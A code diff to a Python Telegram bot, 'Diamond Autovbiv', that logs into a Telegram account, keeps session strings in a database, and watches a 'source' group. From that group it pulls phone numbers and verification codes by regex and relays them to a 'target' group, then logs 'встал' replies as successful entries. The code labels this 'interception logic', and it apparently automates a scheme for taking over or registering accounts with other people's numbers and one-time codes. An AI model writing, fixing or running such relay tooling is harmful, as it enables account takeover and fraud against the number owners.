@@ -1,5 +1,5 @@
 # diamond_autovbiv.py
-# FIXED - РАБОТАЕТ НА RAILWAY
+# FIXED BUTTONS - КНОПКИ РАБОТАЮТ
 
 import os
 import asyncio
@@ -10,22 +10,22 @@ from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError
 from telethon.tl.custom import Button
 
-# ========== КОНФИГ ДЛЯ RAILWAY ==========
+# ========== КОНФИГ ==========
 API_ID = int(os.environ.get("API_ID", 0))
 API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 
-# Путь для сессий в Railway (используем /tmp или переменную окружения)
 SESSION_DIR = os.environ.get("SESSION_DIR", "/app/sessions")
 os.makedirs(SESSION_DIR, exist_ok=True)
 
+DB_PATH = "/app/diamond_data.db"
+
 if not API_ID or not API_HASH or not BOT_TOKEN:
     print("❌ Ошибка: Установите переменные в Railway")
+    print("API_ID, API_HASH, BOT_TOKEN")
     exit(1)
 
 # ========== БАЗА ДАННЫХ ==========
-DB_PATH = "/app/diamond_data.db"
-
 class DiamondDB:
     def __init__(self):
         self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
@@ -145,41 +145,18 @@ db = DiamondDB()
 # ========== ОСНОВНОЙ БОТ ==========
 bot = None
 user_clients = {}
+user_code_inputs = {}  # {user_id: {'code': '123', 'phone': '+7999...', 'msg_id': None}}
 
-async def get_user_client(user_id, session_string=None):
-    if user_id in user_clients:
-        client = user_clients[user_id]
-        if client.is_connected():
-            return client
-    
-    if not session_string:
-        session_string, _, _ = db.get_session(user_id)
-        if not session_string:
-            return None
-    
-    session_path = os.path.join(SESSION_DIR, f"user_{user_id}")
-    client = TelegramClient(session_path, API_ID, API_HASH)
-    await client.connect()
-    
-    if session_string:
-        client.session.set_session_str(session_string)
-        if await client.is_user_authorized():
-            user_clients[user_id] = client
-            return client
-    return None
-
-# ========== КЛАВИАТУРА ДЛЯ ВВОДА КОДА ==========
+# ========== КЛАВИАТУРА ==========
 def get_code_keyboard():
     return [
-        [Button.inline("1", b"code_1"), Button.inline("2", b"code_2"), Button.inline("3", b"code_3")],
-        [Button.inline("4", b"code_4"), Button.inline("5", b"code_5"), Button.inline("6", b"code_6")],
-        [Button.inline("7", b"code_7"), Button.inline("8", b"code_8"), Button.inline("9", b"code_9")],
-        [Button.inline("0", b"code_0"), Button.inline("⌫", b"code_backspace"), Button.inline("✅", b"code_submit")]
+        [Button.inline("1", b"1"), Button.inline("2", b"2"), Button.inline("3", b"3")],
+        [Button.inline("4", b"4"), Button.inline("5", b"5"), Button.inline("6", b"6")],
+        [Button.inline("7", b"7"), Button.inline("8", b"8"), Button.inline("9", b"9")],
+        [Button.inline("0", b"0"), Button.inline("⌫", b"del"), Button.inline("✅ ПОДТВЕРДИТЬ", b"submit")]
     ]
 
-user_code_inputs = {}
-
-# ========== ОБРАБОТЧИКИ КОМАНД ==========
+# ========== ОБРАБОТЧИКИ ==========
 async def setup_handlers():
     global bot
     
@@ -188,20 +165,13 @@ async def setup_handlers():
         await event.reply("""
 💎 **DIAMOND AUTOVBIV BOT** 💎
 
-**Схема работы:**
-📌 ГРУППА 1 (SOURCE) — номера и коды
-📌 ГРУППА 2 (TARGET) — сюда бот отправляет номер+код, сюда пишут "встал"
-
-**Команды:**
 /login <номер> — вход в аккаунт
-/set_source — отметить ГРУППУ 1 (где номера и коды)
-/set_target — отметить ГРУППУ 2 (куда отправлять и где "встал")
+/set_source — отметить группу с номерами и кодами
+/set_target — отметить группу для отправки и "встал"
 /stats — статистика
 /status — статус
-/reset — сброс всех данных
-
-💎 **Бот сразу отправляет номер и код в TARGET**
-        """, parse_mode='markdown')
+/reset — сброс
+        """)
     
     @bot.on(events.NewMessage(pattern='/login (.+)'))
     async def login_cmd(event):
@@ -210,7 +180,6 @@ async def setup_handlers():
         
         await event.reply(f"📱 Отправляю код на {phone}...")
         
-        # ИСПРАВЛЕНО: используем правильный путь для сессии
         session_path = os.path.join(SESSION_DIR, f"temp_{user_id}")
         client = TelegramClient(session_path, API_ID, API_HASH)
         await client.connect()
@@ -220,11 +189,16 @@ async def setup_handlers():
             user_clients[user_id] = client
             db.save_session(user_id, phone, "", "waiting_code")
             
-            await event.reply(
-                f"✅ Код отправлен на {phone}\n\n🔢 **Введите код через кнопки:**",
-                buttons=get_code_keyboard(),
-                parse_mode='markdown'
+            # Сохраняем информацию о вводе
+            user_code_inputs[user_id] = {'code': '', 'phone': phone}
+            
+            # Отправляем сообщение с кнопками
+            sent = await event.reply(
+                f"✅ Код отправлен на {phone}\n\n🔢 **Введите код через кнопки:**\n\nТекущий код: ` `",
+                buttons=get_code_keyboard()
             )
+            user_code_inputs[user_id]['msg_id'] = sent.id
+            
         except Exception as e:
             await event.reply(f"❌ Ошибка: {str(e)}")
     
@@ -233,54 +207,75 @@ async def setup_handlers():
         user_id = event.sender_id
         data = event.data.decode('utf-8')
         
-        _, _, step = db.get_session(user_id)
+        # Проверяем, есть ли пользователь в процессе ввода
+        if user_id not in user_code_inputs:
+            await event.answer("❌ Сначала используйте /login", alert=True)
+            return
         
-        if step == "waiting_code":
-            if user_id not in user_code_inputs:
-                session_string, phone, _ = db.get_session(user_id)
-                user_code_inputs[user_id] = {'code': '', 'phone': phone}
+        current_code = user_code_inputs[user_id]['code']
+        phone = user_code_inputs[user_id]['phone']
+        
+        # Обработка цифр
+        if data.isdigit():
+            user_code_inputs[user_id]['code'] += data
+            new_code = user_code_inputs[user_id]['code']
+            await event.answer(f"Код: {new_code}")
             
-            if data.startswith('code_'):
-                digit = data.split('_')[1]
-                if digit.isdigit():
-                    user_code_inputs[user_id]['code'] += digit
-                    await event.answer(f"Код: {user_code_inputs[user_id]['code']}")
-                    await event.edit(
-                        f"✅ **Введите код:**\n\n🔢 Текущий код: `{user_code_inputs[user_id]['code']}`",
-                        buttons=get_code_keyboard()
-                    )
-                elif digit == 'backspace':
-                    user_code_inputs[user_id]['code'] = user_code_inputs[user_id]['code'][:-1]
-                    await event.answer("Удалено")
-                    await event.edit(
-                        f"✅ **Введите код:**\n\n🔢 Текущий код: `{user_code_inputs[user_id]['code']}`",
-                        buttons=get_code_keyboard()
-                    )
+            # Обновляем сообщение
+            try:
+                await event.edit(
+                    f"✅ Код отправлен на {phone}\n\n🔢 **Введите код через кнопки:**\n\nТекущий код: `{new_code}`",
+                    buttons=get_code_keyboard()
+                )
+            except:
+                pass
+        
+        # Обработка удаления
+        elif data == 'del':
+            user_code_inputs[user_id]['code'] = current_code[:-1]
+            new_code = user_code_inputs[user_id]['code']
+            await event.answer("Удалено")
             
-            elif data == 'code_submit':
-                code = user_code_inputs[user_id].get('code', '')
-                if not code:
-                    await event.answer("Введите код!", alert=True)
-                    return
+            try:
+                await event.edit(
+                    f"✅ Код отправлен на {phone}\n\n🔢 **Введите код через кнопки:**\n\nТекущий код: `{new_code}`",
+                    buttons=get_code_keyboard()
+                )
+            except:
+                pass
+        
+        # Обработка подтверждения
+        elif data == 'submit':
+            code = user_code_inputs[user_id]['code']
+            if not code:
+                await event.answer("❌ Введите код!", alert=True)
+                return
+            
+            await event.answer(f"⏳ Проверяю код {code}...")
+            
+            client = user_clients.get(user_id)
+            if not client:
+                await event.edit("❌ Сессия потеряна. Используйте /login заново")
+                del user_code_inputs[user_id]
+                return
+            
+            try:
+                await client.sign_in(code=code)
+                session_string = client.session.save()
+                user_phone = (await client.get_me()).phone
+                db.save_session(user_id, user_phone, session_string, "authorized")
                 
-                await event.answer(f"Проверяю код {code}...")
+                await event.edit(f"✅ **Вход выполнен!**\n\nАккаунт: {user_phone}\n\nТеперь настройте группы:\n/set_source — группа с номерами и кодами\n/set_target — группа для отправки")
+                del user_code_inputs[user_id]
                 
-                client = user_clients.get(user_id)
-                if client:
-                    try:
-                        await client.sign_in(code=code)
-                        session_string = client.session.save()
-                        phone = (await client.get_me()).phone
-                        db.save_session(user_id, phone, session_string, "authorized")
-                        await event.edit(f"✅ **Вход выполнен!**\n\nАккаунт: {phone}\n\nТеперь настройте группы:\n/set_source — группа с номерами и кодами\n/set_target — группа для отправки")
-                        del user_code_inputs[user_id]
-                    except SessionPasswordNeededError:
-                        db.save_session(user_id, phone, "", "waiting_2fa")
-                        await event.edit(f"🔐 **Требуется 2FA пароль**\n\nИспользуйте: `/2fa <пароль>`", parse_mode='markdown')
-                        del user_code_inputs[user_id]
-                    except Exception as e:
-                        await event.edit(f"❌ Ошибка: {str(e)}")
-                        del user_code_inputs[user_id]
+            except SessionPasswordNeededError:
+                db.save_session(user_id, phone, "", "waiting_2fa")
+                await event.edit(f"🔐 **Требуется 2FA пароль**\n\nИспользуйте: `/2fa <пароль>`")
+                del user_code_inputs[user_id]
+                
+            except Exception as e:
+                await event.edit(f"❌ Ошибка: {str(e)}\n\nПопробуйте /login заново")
+                del user_code_inputs[user_id]
     
     @bot.on(events.NewMessage(pattern='/2fa (.+)'))
     async def twofa_cmd(event):
@@ -299,7 +294,7 @@ async def setup_handlers():
             session_string = client.session.save()
             phone = (await client.get_me()).phone
             db.save_session(user_id, phone, session_string, "authorized")
-            await event.reply(f"✅ **Вход выполнен!**\n\nАккаунт: {phone}\n\nТеперь настройте группы.")
+            await event.reply(f"✅ **Вход выполнен!**\n\nАккаунт: {phone}")
         except Exception as e:
             await event.reply(f"❌ Ошибка: {str(e)}")
     
@@ -309,13 +304,7 @@ async def setup_handlers():
         source_group = event.chat_id
         _, target_group = db.get_groups(user_id)
         db.set_groups(user_id, source_group, target_group)
-        await event.reply(f"✅ **ГРУППА 1 (SOURCE) установлена!**\n\n📌 Сюда бот будет смотреть номера и коды")
-        
-        session_string, _, _ = db.get_session(user_id)
-        if session_string:
-            client = await get_user_client(user_id, session_string)
-            if client and source_group:
-                asyncio.create_task(start_source_listener(user_id, client, source_group, event.chat_id))
+        await event.reply(f"✅ **ГРУППА ИСТОЧНИК установлена!**\n\nID: {source_group}")
     
     @bot.on(events.NewMessage(pattern='/set_target'))
     async def set_target_cmd(event):
@@ -323,28 +312,35 @@ async def setup_handlers():
         target_group = event.chat_id
         source_group, _ = db.get_groups(user_id)
         db.set_groups(user_id, source_group, target_group)
-        await event.reply(f"✅ **ГРУППА 2 (TARGET) установлена!**\n\n📌 Сюда бот будет отправлять номера и коды\n📌 Сюда пишут 'встал'")
+        await event.reply(f"✅ **ГРУППА ЦЕЛЬ установлена!**\n\nID: {target_group}")
+        
+        # Запускаем слушатель для источника
+        session_string, _, _ = db.get_session(user_id)
+        if session_string and source_group:
+            client = await get_user_client(user_id, session_string)
+            if client:
+                asyncio.create_task(start_source_listener(user_id, client, source_group))
     
     @bot.on(events.NewMessage(pattern='/stats'))
     async def stats_cmd(event):
         user_id = event.sender_id
         stats = db.get_stats_today(user_id)
         msg = f"📊 **СТАТИСТИКА ЗА СЕГОДНЯ**\n\n"
-        msg += f"📱 Взято номеров: {stats.get('number_taken', 0)}\n"
-        msg += f"🔢 Взято кодов: {stats.get('code_taken', 0)}\n"
-        msg += f"✅ Успешных вставов: {stats.get('success', 0)}\n"
-        await event.reply(msg, parse_mode='markdown')
+        msg += f"📱 Номеров: {stats.get('number_taken', 0)}\n"
+        msg += f"🔢 Кодов: {stats.get('code_taken', 0)}\n"
+        msg += f"✅ Успешно: {stats.get('success', 0)}"
+        await event.reply(msg)
     
     @bot.on(events.NewMessage(pattern='/status'))
     async def status_cmd(event):
         user_id = event.sender_id
-        session_string, phone, _ = db.get_session(user_id)
+        _, phone, _ = db.get_session(user_id)
         source_group, target_group = db.get_groups(user_id)
         msg = f"⚙️ **СТАТУС**\n\n"
-        msg += f"👤 Аккаунт: {phone or '❌ не авторизован'}\n"
-        msg += f"📥 ГРУППА 1 (номера+коды): {source_group or '❌'}\n"
-        msg += f"📤 ГРУППА 2 (отправка+встал): {target_group or '❌'}\n"
-        await event.reply(msg, parse_mode='markdown')
+        msg += f"👤 Аккаунт: {phone or '❌'}\n"
+        msg += f"📥 Источник: {source_group or '❌'}\n"
+        msg += f"📤 Цель: {target_group or '❌'}"
+        await event.reply(msg)
     
     @bot.on(events.NewMessage(pattern='/reset'))
     async def reset_cmd(event):
@@ -355,44 +351,56 @@ async def setup_handlers():
         db.cursor.execute('DELETE FROM sessions WHERE user_id = ?', (user_id,))
         db.cursor.execute('DELETE FROM groups WHERE user_id = ?', (user_id,))
         db.conn.commit()
-        await event.reply("✅ Все данные сброшены. Используйте /login для входа.")
+        await event.reply("✅ Сброшено. Используйте /login")
     
-    # ========== ОСНОВНАЯ ЛОГИКА ==========
-    async def start_source_listener(user_id, client, source_group_id, notify_chat_id):
-        """Слушаем ГРУППУ 1 — здесь номера и коды"""
+    # ========== ЛОГИКА ПЕРЕХВАТА ==========
+    async def get_user_client(user_id, session_string=None):
+        if user_id in user_clients:
+            client = user_clients[user_id]
+            if client.is_connected():
+                return client
+        
+        if not session_string:
+            session_string, _, _ = db.get_session(user_id)
+            if not session_string:
+                return None
+        
+        session_path = os.path.join(SESSION_DIR, f"user_{user_id}")
+        client = TelegramClient(session_path, API_ID, API_HASH)
+        await client.connect()
+        client.session.set_session_str(session_string)
+        
+        if await client.is_user_authorized():
+            user_clients[user_id] = client
+            return client
+        return None
+    
+    async def start_source_listener(user_id, client, source_group_id):
+        """Слушаем группу-источник"""
         
         @client.on(events.NewMessage(chats=source_group_id))
-        async def handle_source_messages(event):
+        async def handle_source(event):
             if event.sender_id == (await client.get_me()).id:
                 return
             
             text = event.raw_text.strip()
             
-            # 1. Ищем НОМЕР
+            # Номер телефона
             phone_match = re.search(r'(\+?\d{10,15})', text)
             if phone_match:
                 phone = phone_match.group(1)
-                
                 db.add_pending_number(user_id, phone)
                 db.add_stat(user_id, phone, 'number_taken')
                 
                 _, target_group = db.get_groups(user_id)
                 if target_group:
-                    await client.send_message(
-                        target_group,
-                        f"📱 **НОМЕР ДЛЯ АВТОВБИВА**\n\n`{phone}`\n\n⏳ Ожидание кода..."
-                    )
-                    
-                    await bot.send_message(
-                        notify_chat_id,
-                        f"📱 **Взял номер:** `{phone}`\n➡️ Отправлен в целевую группу"
-                    )
+                    await client.send_message(target_group, f"📱 **НОМЕР:** `{phone}`")
+                print(f"📱 Номер: {phone}")
             
-            # 2. Ищем КОД
+            # Код
             code_match = re.search(r'\b(\d{4,8})\b', text)
             if code_match and not phone_match:
                 code = code_match.group(1)
-                
                 last_phone = db.get_last_pending_number(user_id)
                 
                 if last_phone:
@@ -401,18 +409,12 @@ async def setup_handlers():
                     
                     _, target_group = db.get_groups(user_id)
                     if target_group:
-                        await client.send_message(
-                            target_group,
-                            f"🔢 **КОД ПОДТВЕРЖДЕНИЯ**\n\nКод: `{code}`\nДля номера: `{last_phone}`\n\n✅ Ожидание подтверждения 'встал'..."
-                        )
-                        
-                        await bot.send_message(
-                            notify_chat_id,
-                            f"🔢 **Взял код:** `{code}` для номера `{last_phone}`\n➡️ Отправлен в целевую группу"
-                        )
+                        await client.send_message(target_group, f"🔢 **КОД:** `{code}` для `{last_phone}`")
+                    print(f"🔢 Код: {code} для {last_phone}")
     
+    # Слушаем "встал" в целевой группе
     @bot.on(events.NewMessage())
-    async def handle_target_messages(event):
+    async def handle_target(event):
         user_id = event.sender_id
         _, target_group = db.get_groups(user_id)
         
@@ -421,43 +423,25 @@ async def setup_handlers():
         
         text = event.raw_text.lower()
         
-        if 'встал' in text or 'успех' in text or 'success' in text:
+        if 'встал' in text or 'успех' in text:
             phone_match = re.search(r'(\+?\d{10,15})', text)
             if phone_match:
                 phone = phone_match.group(1)
-                
                 db.mark_success(phone)
                 db.add_stat(user_id, phone, 'success')
-                
-                await event.reply(f"✅ **{phone} — ВСТАЛ!**\n💎 Аккаунт успешно автовбит!")
-    
-    # Запускаем слушатели
-    async def start_listeners():
-        db.cursor.execute('SELECT user_id FROM sessions WHERE session_string IS NOT NULL AND session_string != ""')
-        users = db.cursor.fetchall()
-        for (user_id,) in users:
-            session_string, _, _ = db.get_session(user_id)
-            source_group, _ = db.get_groups(user_id)
-            if session_string and source_group:
-                client = await get_user_client(user_id, session_string)
-                if client:
-                    asyncio.create_task(start_source_listener(user_id, client, source_group, user_id))
-    
-    asyncio.create_task(start_listeners())
+                await event.reply(f"✅ **{phone} — ВСТАЛ!**")
 
 # ========== ЗАПУСК ==========
 async def main():
     global bot
-    print("💎 DIAMOND AUTOVBIV BOT — ФИНАЛЬНАЯ ВЕРСИЯ")
+    print("💎 DIAMOND AUTOVBIV BOT")
     print(f"📡 API_ID: {API_ID}")
-    print(f"📁 Session dir: {SESSION_DIR}")
     
-    # Создаём бота с правильным путём
     bot = TelegramClient(os.path.join(SESSION_DIR, "main_bot"), API_ID, API_HASH)
     await bot.start(bot_token=BOT_TOKEN)
     
     await setup_handlers()
-    print("✅ Бот запущен!")
+    print("✅ Бот запущен! Кнопки должны работать.")
     await bot.run_until_disconnected()
 
 if __name__ == "__main__":
